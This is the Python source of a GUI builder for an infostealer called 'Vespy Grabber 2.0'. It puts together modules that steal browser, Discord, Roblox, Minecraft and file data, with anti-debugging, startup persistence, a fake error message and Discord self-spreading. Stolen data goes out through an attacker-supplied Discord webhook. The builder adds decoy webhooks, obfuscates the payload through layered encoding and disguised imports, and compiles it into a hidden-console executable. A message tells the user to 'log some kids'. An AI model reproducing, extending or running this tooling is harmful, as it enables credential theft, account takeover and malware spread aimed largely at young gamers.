# If you dont like how I code, idgaf, kys - vesper & scel
import os, webbrowser, requests, random, string, base64, marshal, pickle, zlib, shutil
from time import sleep
from PIL import ImageTk, ImageSequence
from tkinter import *
from pyperclip import copy
from threading import Thread
from tkinter import messagebox
from discord_webhook import DiscordWebhook, DiscordEmbed
from tkinter.filedialog import askopenfilename

window = Tk()
window.title("Vespy Grabber 2.0 || @i_might_be_vesper")
window.geometry("744x447")
window.maxsize(744, 447)
window.minsize(744, 447)
window.iconbitmap("assets/mylogo.ico")

backg = PhotoImage(file='assets/background.png')
backg1 = PhotoImage(file='assets/background2.png')
backg2 = PhotoImage(file='assets/background3.png')
backg3 = PhotoImage(file='assets/background4.png')
backg4 = PhotoImage(file='assets/background5.png')
menu = PhotoImage(file='assets/img0.png')
setup = PhotoImage(file='assets/img2.png')
compilee = PhotoImage(file='assets/img1.png')
about = PhotoImage(file='assets/img3.png')
trybu = PhotoImage(file='assets/img4.png')
BTC = PhotoImage(file='assets/btc.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
testbu = PhotoImage(file='assets/test.png')
browsebu = PhotoImage(file='assets/browse.png')
compilebu = PhotoImage(file='assets/compile.png')

class Builder:
    
    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        self.FILE = open(f"{name}.py","w+")
        self.FILE.write(open("utils/Imports.py","r").read()+"\n")
        if webhookJ:
            embed.add_embed_field(name=f"Webhook Junk : ", value=f":white_check_mark:")
            self.FILE.write(self._webhooksJUNK(False))
        else:
            embed.add_embed_field(name=f"Webhook Junk : ", value=f":x:")
        self.FILE.write(f"wbh = '{wbh}'\n")
        if webhookJ:
            self.FILE.write(self._webhooksJUNK(True)+"\n")
        self.FILE.write("dtokens = []\n")
        if browserR:
            embed.add_embed_field(name=f"Browser Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Browser.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Browser Recovery : ", value=f":x:")
            self.FILE.write("class Browsers():\n\tpass\n")
        if discordR:
            embed.add_embed_field(name=f"Discord Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Discord.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Discord Recovery : ", value=f":x:")
            self.FILE.write("class DISCORD:\n\tpass\n")
        if robloxR:
            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Roblox.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Roblox Recovery : ", value=f":x:")
            self.FILE.write("class Roblox:\n\tpass\n")
        if filesR:
            embed.add_embed_field(name=f"Files Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Files.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Files Recovery : ", value=f":x:")
            self.FILE.write("class Files:\n\tpass\n")
        if minecraftR:
            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Minecraft.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Minecraft Recovery : ", value=f":x:")
            self.FILE.write("class Minecraft:\n\tpass\n")
        if networkI:
            embed.add_embed_field(name=f"Network Info : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Network.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Network Info : ", value=f":x:")
            self.FILE.write("class Network:\n\tpass\n")
        if antiD:
            embed.add_embed_field(name=f"Anti Debug : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/AntiDebug.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Anti Debug : ", value=f":x:")
            self.FILE.write("class Antidebug:\n\tpass\n")
        if rebootP:
            embed.add_embed_field(name=f"Reboot : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Reboot.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Reboot : ", value=f":x:")
            self.FILE.write("class Reboot:\n\tpass\n")
        if startupP:
            embed.add_embed_field(name=f"Startup : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/Startup.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Startup : ", value=f":x:")
            self.FILE.write("class Startup:\n\tpass\n")
        if errorM:
            embed.add_embed_field(name=f"Error Message : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/ErrorMSG.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Error Message : ", value=f":x:")
            self.FILE.write("class ErrorMsg:\n\tpass\n")
        if discordS:
            embed.add_embed_field(name=f"Discord Spreading : ", value=f":white_check_mark:")
            self.FILE.write(open("utils/DiscordSpreading.py",'r').read()+"\n")
        else:
            embed.add_embed_field(name=f"Discord Spreading : ", value=f":x:")
            self.FILE.write("class Spread:\n\tpass\n")
        Maincode = open("utils/Main.py",'r').read()
        if pingH:
            embed.add_embed_field(name=f"Ping : ", value=f":white_check_mark:")
            Maincode = Maincode.replace("jtjirjihirthr = False","jtjirjihirthr = True")
        else:
            embed.add_embed_field(name=f"Ping : ", value=f":x:")
        self.FILE.write(Maincode+"\n")
        self.FILE.write("""
def main():
    Thread(target=Antidebug).start()
    Startup()
    Thread(target=ErrorMsg).start()
    Screeny()
    Browsers()
    DISCORD()
    Roblox()
    Files()
    Minecraft()
    Network()
    Spread()
    Reboot()
main()
""")
        self.FILE.close()
        if obfuscateS:
            try:
                self._Obfuscation(name)
                embed.add_embed_field(name=f"Obfuscate : ", value=f":white_check_mark:")
            except:
                embed.add_embed_field(name=f"Obfuscation Failed : ", value=f":white_check_mark:")
        else:
            embed.add_embed_field(name=f"Obfuscate : ", value=f":x:")
        self._Compile(icon = icon, name = name)
        webhook.add_embed(embed)
        webhook.execute()
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","Grabber Successfully Compiled. Go log some kids now bitch")
        Menu()
    
    def _webhooksJUNK(self, writed):
        junkcode = ""
        if writed:
            hooksname = ["real_webhook","thewebhook","webh","fake_webhook","fake_wbh","webHOOK"]
        else:
            hooksname = ["wbh", "real_webhook","thewebhook","webh","fake_webhook","fake_wbh","webHOOK"]
        hookstype = ["https://discord.com/api/webhooks/","https://discordapp.com/api/webhooks/","https://ptb.discord.com/api/webhooks/","https://canary.discord.com/api/webhooks/"]
        hookslenght = [68,67,66,65]
        lastpart = "-"
        lstpart = "_"
        for _ in range(125):
            hook = f"{random.choice(hooksname)} = "+f"'{random.choice(hookstype)}1"+''.join(random.choice(string.digits) for _ in range(18))+"/"+''.join(random.choice(string.digits+string.ascii_lowercase+string.ascii_uppercase+lastpart+lstpart) for _ in range(random.choice(hookslenght)))+"'"
            junkcode+=f"{hook}\n"
        return junkcode
    
    def _Obfuscation(self, name):
        # Shit obfuscation, will make it better next update
        CONTENT = open(f"{name}.py","r").read()
        for _ in range(2):
            POOP = base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(CONTENT.encode(),f"WHAT????","exec"))))).decode()
            CONTENT = f"""{open("utils/Imports.py","r").read()}\n__Obf__="Simple Obf"
"""+"""__import__(f"{chr(98)}{chr(117)}{chr(105)}{chr(108)}{chr(116)}{chr(105)}{chr(110)}{chr(115)}").exec(__import__(f"{chr(109)}{chr(97)}{chr(114)}{chr(115)}{chr(104)}{chr(97)}{chr(108)}").loads(__import__(f"{chr(112)}{chr(105)}{chr(99)}{chr(107)}{chr(108)}{chr(101)}").loads(__import__(f"{chr(122)}{chr(108)}{chr(105)}{chr(98)}").decompress(__import__(f"{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}").b16decode("""+f"""'{POOP}')))))
"""
        with open(f"{name}.py","w+") as f:f.write(CONTENT);f.close()
    
    def _Compile(self, icon, name):
        if icon == "":
            os.system(f"pyinstaller --onefile --name {name} --noconsole --clean {name}.py")
        else:
            os.system(f"pyinstaller --onefile --name {name} --icon {icon} --noconsole --clean {name}.py")
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
        except:pass
        try:
            shutil.rmtree('build')
        except:pass
        try:
            shutil.rmtree('dist')
        except:pass
        try:
            shutil.rmtree('__pycache__')
        except:pass
        try:
            os.remove(f'{name}.spec')
        except:pass
        try:
            os.remove(f'{name}.py')
        except:pass

class Menu:
    
    def __init__(self):
        self.browserR = False
        self.discordR = False
        self.robloxR = False
        self.filesR = False
        self.minecraftR = False
        self.networkI = False
        self.obfuscateS = False
        self.webhookJ = False
        self.antiD = False
        self.rebootP = False
        self.startupP = False
        self.errorM = False
        self.pingH = False
        self.discordS = False
        self._background()

    def _vespyRAT(self):
        webbrowser.open("https://github.com/vesperlol/Vespy-RAT")

    def _background(self):
        bg = Label(window, image=backg,borderwidth=0)
        bg.place(x=0, y=0)
        self.menuBUTTON = Button(window, image=menu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._menu)
        self.menuBUTTON.place(x=58,y=177)
        self.setupBUTTON = Button(window, image=setup,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._setup)
        self.setupBUTTON.place(x=58,y=244)
        self.compileBUTTON = Button(window, image=compilee,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._compile)
        self.compileBUTTON.place(x=58,y=311)
        self.aboutBUTTON = Button(window, image=about,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._about)
        self.aboutBUTTON.place(x=58,y=378)
        self._menu()

    def _menu(self):
        bg2 = Label(window, image=backg1,borderwidth=0)
        bg2.place(x=156, y=62)
        tryz = Button(window, image=trybu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._vespyRAT)
        tryz.place(x=546,y=372)
    
    def _brsetup(self):
        if self.browserR:
            self.BrowserR.config(image=blankbu)
            self.browserR = False
        else:
            self.BrowserR.config(image=fullbu)
            self.browserR = True
    
    def _drsetup(self):
        if self.discordR:
            self.DiscordR.config(image=blankbu)
            self.discordR = False
        else:
            self.DiscordR.config(image=fullbu)
            self.discordR = True
    
    def _rrsetup(self):
        if self.robloxR:
            self.RobloxR.config(image=blankbu)
            self.robloxR = False
        else:
            self.RobloxR.config(image=fullbu)
            self.robloxR = True
    
    def _frsetup(self):
        if self.filesR:
            self.FilesR.config(image=blankbu)
            self.filesR = False
        else:
            self.FilesR.config(image=fullbu)
            self.filesR = True
    
    def _mrsetup(self):
        if self.minecraftR:
            self.MinecraftR.config(image=blankbu)
            self.minecraftR = False
        else:
            self.MinecraftR.config(image=fullbu)
            self.minecraftR = True
    
    def _nisetup(self):
        if self.networkI:
            self.NetworkI.config(image=blankbu)
            self.networkI = False
        else:
            self.NetworkI.config(image=fullbu)
            self.networkI = True

    def _ossetup(self):
        if self.obfuscateS:
            self.ObfuscateS.config(image=blankbu)
            self.obfuscateS = False
        else:
            self.ObfuscateS.config(image=fullbu)
            self.obfuscateS = True
    
    def _wjsetup(self):
        if self.webhookJ:
            self.WebhookJ.config(image=blankbu)
            self.webhookJ = False
        else:
            self.WebhookJ.config(image=fullbu)
            self.webhookJ = True
    
    def _adsetup(self):
        if self.antiD:
            self.AntiD.config(image=blankbu)
            self.antiD = False
        else:
            self.AntiD.config(image=fullbu)
            self.antiD = True
    
    def _rpsetup(self):
        if self.rebootP:
            self.RebootP.config(image=blankbu)
            self.rebootP = False
        else:
            self.RebootP.config(image=fullbu)
            self.rebootP = True

    def _spsetup(self):
        if self.startupP:
            self.StartupP.config(image=blankbu)
            self.startupP = False
        else:
            self.StartupP.config(image=fullbu)
            self.startupP = True
    
    def _emsetup(self):
        if self.errorM:
            self.ErrorM.config(image=blankbu)
            self.errorM = False
        else:
            self.ErrorM.config(image=fullbu)
            self.errorM = True

    def _setup(self):
        bg = Label(window, image=backg3, borderwidth=0)
        bg.place(x=156, y=62)
        if self.browserR == False:
            self.BrowserR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._brsetup)
            self.BrowserR.place(x=228,y=112)
        else:
            self.BrowserR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._brsetup)
            self.BrowserR.place(x=228,y=112)
        if self.discordR == False:
            self.DiscordR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._drsetup)
            self.DiscordR.place(x=228,y=151)
        else:
            self.DiscordR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._drsetup)
            self.DiscordR.place(x=228,y=151)
        if self.robloxR == False:
            self.RobloxR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rrsetup)
            self.RobloxR.place(x=228,y=190)
        else:
            self.RobloxR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rrsetup)
            self.RobloxR.place(x=228,y=190)
        if self.filesR == False:
            self.FilesR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._frsetup)
            self.FilesR.place(x=494,y=112)
        else:
            self.FilesR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._frsetup)
            self.FilesR.place(x=494,y=112)
        if self.minecraftR == False:
            self.MinecraftR = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._mrsetup)
            self.MinecraftR.place(x=494,y=151)
        else:
            self.MinecraftR = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._mrsetup)
            self.MinecraftR.place(x=494,y=151)
        if self.networkI == False:
            self.NetworkI = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._nisetup)
            self.NetworkI.place(x=494,y=190)
        else:
            self.NetworkI = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._nisetup)
            self.NetworkI.place(x=494,y=190)
        if self.obfuscateS == False:
            self.ObfuscateS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._ossetup)
            self.ObfuscateS.place(x=228,y=284)
        else:
            self.ObfuscateS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._ossetup)
            self.ObfuscateS.place(x=228,y=284)
        if self.webhookJ == False:
            self.WebhookJ = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wjsetup)
            self.WebhookJ.place(x=228,y=324)
        else:
            self.WebhookJ = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wjsetup)
            self.WebhookJ.place(x=228,y=324)
        if self.antiD == False:
            self.AntiD = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
            self.AntiD.place(x=228,y=363)
        else:
            self.AntiD = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._adsetup)
            self.AntiD.place(x=228,y=363)
        if self.rebootP == False:
            self.RebootP = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rpsetup)
            self.RebootP.place(x=494,y=284)
        else:
            self.RebootP = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._rpsetup)
            self.RebootP.place(x=494,y=284)
        if self.startupP == False:
            self.StartupP = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._spsetup)
            self.StartupP.place(x=494,y=324)
        else:
            self.StartupP = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._spsetup)
            self.StartupP.place(x=494,y=324)
        if self.errorM == False:
            self.ErrorM = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._emsetup)
            self.ErrorM.place(x=494,y=363)
        else:
            self.ErrorM = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._emsetup)
            self.ErrorM.place(x=494,y=363)

    def _testhook(self):
        wbh = self.webhook.get()
        try:
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
            embed = DiscordEmbed(title=f"Vespy Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
        except:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")

    def _phsetup(self):
        if self.pingH:
            self.PingH.config(image=blankbu)
            self.pingH = False
        else:
            self.PingH.config(image=fullbu)
            self.pingH = True
    
    def _dssetup(self):
        if self.discordS:
            self.DiscordS.config(image=blankbu)
            self.discordS = False
        else:
            self.DiscordS.config(image=fullbu)
            self.discordS = True

    def _browse(self):
        self.icon.delete(0, END)
        self.icon.insert(END,askopenfilename(filetypes=(("ico files","*.ico"),("All files","*.*"))))

    def _verification(self):
        if len(self.webhook.get()) < 5:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Webhook too short idiot")
        else:
            try:
                r=requests.get(self.webhook.get())
                if r.status_code == 200 or r.status_code == 204:
                    webhook = self.webhook.get()
                    name = self.name.get().replace(" ","_").replace(".","_")
                    if name == "Name":
                        name = "Default"
                    icon = self.icon.get()
                    if icon == "Icon Path" or icon == "":
                        icon = ""
                    # :skull: ik
                    Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
                else:
                    messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
            except:
                messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")

    def _compile(self):
        bg = Label(window, image=backg4, borderwidth=0)
        bg.place(x=156, y=62)
        self.webhook = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=47,borderwidth=0)
        self.webhook.insert(0, 'Webhook')
        self.webhook.place(x=238, y=123)
        testt = Button(window, image=testbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._testhook)
        testt.place(x=590,y=116)
        if self.pingH == False:
            self.PingH = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._phsetup)
            self.PingH.place(x=235,y=181)
        else:
            self.PingH = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._phsetup)
            self.PingH.place(x=235,y=181)
        if self.discordS == False:
            self.DiscordS = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._dssetup)
            self.DiscordS.place(x=465,y=181)
        else:
            self.DiscordS = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._dssetup)
            self.DiscordS.place(x=465,y=181)
        self.name = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=21,borderwidth=0)
        self.name.insert(0, 'Name')
        self.name.place(x=238, y=316)
        self.icon = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=21,borderwidth=0)
        self.icon.insert(0, 'Icon Path')
        self.icon.place(x=238, y=383)
        brrrowse = Button(window, image=browsebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._browse)
        brrrowse.place(x=409,y=377)
        Compile = Button(window, image=compilebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._verification)
        Compile.place(x=558,y=301)

    def _btc(self):
        copy("bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf")
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","BTC Address Copied, ty <3")

    def _about(self):
        bg = Label(window, image=backg2, borderwidth=0)
        bg.place(x=156, y=62)
        btcc = Button(window, image=BTC,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._btc)
        btcc.place(x=428,y=385)

class Animation:

    def __init__(self):
        self.img = __import__('PIL').Image.open('assets/epicanim.gif')
        self.LB = Label(window)
        self.LB.place(x=0,y=0,width=744,height=447)
        for self.img in ImageSequence.Iterator(self.img):
            self._anim()
        Menu()
    
    def _anim(self):
        sleep(0.025)
        self.img=ImageTk.PhotoImage(self.img)
        self.LB.config(image=self.img)
        window.update()

Animation()
window.mainloop()
